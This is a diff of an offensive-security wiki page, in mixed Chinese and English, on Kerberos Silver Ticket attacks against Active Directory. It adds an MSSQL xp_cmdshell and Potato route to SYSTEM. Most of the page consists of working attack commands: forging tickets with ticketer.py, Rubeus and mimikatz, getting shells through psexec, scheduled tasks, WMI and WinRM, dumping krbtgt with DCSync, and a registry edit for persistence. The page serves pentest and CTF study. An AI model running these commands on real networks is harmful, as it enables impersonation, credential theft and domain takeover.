@@ -6,13 +6,13 @@
 
 ## Silver ticket
 
-**银票**攻击涉及在Active Directory (AD)环境中利用服务票证。此方法依赖于**获取服务帐户的NTLM哈希**，例如计算机帐户，以伪造票证授予服务(TGS)票证。通过这个伪造的票证，攻击者可以访问网络上的特定服务，**冒充任何用户**，通常旨在获取管理权限。强调使用AES密钥伪造票证更安全且不易被检测。
+The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
 
 > [!WARNING]
-> 银票比金票更不易被检测，因为它们只需要**服务帐户的哈希**，而不需要krbtgt帐户。然而，它们仅限于其目标的特定服务。此外，仅仅窃取用户的密码。
-此外，如果您通过**SPN**破坏了一个帐户的密码，您可以使用该密码创建一个银票，冒充任何用户访问该服务。
+> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
+> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.
 
-对于票证制作，根据操作系统使用不同的工具：
+For ticket crafting, different tools are employed based on the operating system:
 
 ### On Linux
 ```bash
@@ -20,7 +20,7 @@ python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-### 在Windows上
+### 在 Windows 上
 ```bash
 # Using Rubeus
 ## /ldap option is used to get domain data automatically
@@ -37,26 +37,58 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-CIFS服务被强调为访问受害者文件系统的常见目标，但其他服务如HOST和RPCSS也可以被利用来执行任务和WMI查询。
+CIFS 服务被强调为访问受害者文件系统的常见目标，但像 HOST 和 RPCSS 这样的其他服务也可以被利用来执行任务和进行 WMI 查询。
+
+### 示例：MSSQL 服务 (MSSQLSvc) + Potato to SYSTEM
+
+如果你拥有某个 SQL 服务账号（例如 sqlsvc）的 NTLM hash（或 AES key），你可以为 MSSQL SPN 伪造一个 TGS，并向 SQL 服务冒充任意用户。从那里，启用 xp_cmdshell 以该 SQL 服务账号的身份执行命令。如果该令牌具有 SeImpersonatePrivilege，则可以链式使用 Potato 提权到 SYSTEM。
+```bash
+# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
+python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
+-spn MSSQLSvc/<host.fqdn>:1433 administrator
+export KRB5CCNAME=$PWD/administrator.ccache
+
+# Connect to SQL using Kerberos and run commands via xp_cmdshell
+impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
+-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
+```
+- 如果获得的上下文具有 SeImpersonatePrivilege（对于服务账户通常为真），使用 Potato 变体来获取 SYSTEM：
+```bash
+# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
+PrintSpoofer.exe -c "cmd /c whoami"
+# or
+GodPotato -cmd "cmd /c whoami"
+```
+关于滥用 MSSQL 和启用 xp_cmdshell 的更多细节：
+
+{{#ref}}
+abusing-ad-mssql.md
+{{#endref}}
+
+Potato 技术概述：
+
+{{#ref}}
+../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
+{{#endref}}
 
 ## 可用服务
 
-| 服务类型                                   | 服务银票                                                         |
-| ------------------------------------------ | --------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                        |
-| PowerShell远程                             | <p>HOST</p><p>HTTP</p><p>根据操作系统还可以:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下你可以直接请求: WINRM</p> |
-| 计划任务                                  | HOST                                                           |
-| Windows文件共享，也包括psexec            | CIFS                                                           |
-| LDAP操作，包括DCSync                      | LDAP                                                           |
-| Windows远程服务器管理工具                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                             |
-| 黄金票                                     | krbtgt                                                         |
+| 服务类型                                   | Service Silver Tickets                                                     |
+| ------------------------------------------ | -------------------------------------------------------------------------- |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>视操作系统而定：</p><p>WSMAN</p><p>RPCSS</p>       |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下你可以只请求：WINRM</p>               |
+| 计划任务                                   | HOST                                                                       |
+| Windows 文件共享，也 psexec                 | CIFS                                                                       |
+| LDAP 操作（包括 DCSync）                   | LDAP                                                                       |
+| Windows 远程服务器管理工具                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
+| Golden Tickets                             | krbtgt                                                                     |
 
-使用**Rubeus**你可以使用参数**请求所有**这些票证：
+使用 **Rubeus** 可以通过以下参数**请求所有**这些票据：
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### 银票事件ID
+### Silver tickets 事件 ID
 
 - 4624: 账户登录
 - 4634: 账户注销
@@ -64,21 +96,21 @@ CIFS服务被强调为访问受害者文件系统的常见目标，但其他服�
 
 ## 持久性
 
-为了避免机器每30天更改一次密码，可以设置`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`，或者可以将`HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge`设置为大于30天的值，以指示机器密码应更改的轮换周期。
+为避免机器每30天轮换密码，可设置 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`，或者可以将 `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` 设置为大于 30days 的值，以指示机器密码应在何时轮换。
 
-## 滥用服务票证
+## 滥用服务票据
 
-在以下示例中，假设票证是通过模拟管理员账户获取的。
+在以下示例中，假设票据是通过模拟管理员账户获取的。
 
 ### CIFS
 
-使用此票证，你将能够通过**SMB**访问`C$`和`ADMIN$`文件夹（如果它们被暴露）并将文件复制到远程文件系统的某个部分，只需执行类似以下操作：
+使用该票据，你可以通过 **SMB**（如果暴露）访问 `C$` 和 `ADMIN$` 文件夹，并将文件复制到远程文件系统的某个位置，例如执行如下操作：
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-您还可以通过 **psexec** 在主机内部获取 shell 或执行任意命令：
+你还可以使用 **psexec** 在主机内获得 shell 或执行任意命令：
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
@@ -86,7 +118,7 @@ copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 
 ### HOST
 
-通过此权限，您可以在远程计算机上生成计划任务并执行任意命令：
+拥有此权限后，你可以在远程计算机上创建计划任务并执行任意命令：
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -100,7 +132,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-使用这些票证，您可以**在受害者系统中执行 WMI**：
+利用这些 tickets，你可以 **在受害系统中执行 WMI**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -110,34 +142,35 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-找到有关 **wmiexec** 的更多信息，请访问以下页面：
+在以下页面查找**更多关于 wmiexec 的信息**：
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
 {{#endref}}
 
-### HOST + WSMAN (WINRM)
+### 主机 + WSMAN (WINRM)
 
-通过 winrm 访问计算机，您可以 **访问它**，甚至获取 PowerShell：
+通过对计算机的 winrm 访问，你可以**访问它**，甚至获得一个 PowerShell：
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-查看以下页面以了解 **使用 winrm 连接远程主机的更多方法**：
+Check the following page to learn **more ways to connect with a remote host using winrm**:
+
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> 请注意，**winrm 必须在远程计算机上处于活动状态并监听**才能访问它。
+> 注意 **winrm 必须在远程计算机上启用并处于监听状态** 才能访问它。
 
 ### LDAP
 
-凭借此权限，您可以使用 **DCSync** 转储 DC 数据库：
+拥有此权限后，您可以使用 **DCSync** 转储 DC 数据库：
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**了解更多关于 DCSync** 在以下页面：
+**了解更多关于 DCSync 的信息**，请参阅以下页面：
 
 
 {{#ref}}
@@ -145,11 +178,12 @@ dcsync.md
 {{#endref}}
 
 
-## 参考文献
+## 参考资料
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
+- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
 
 
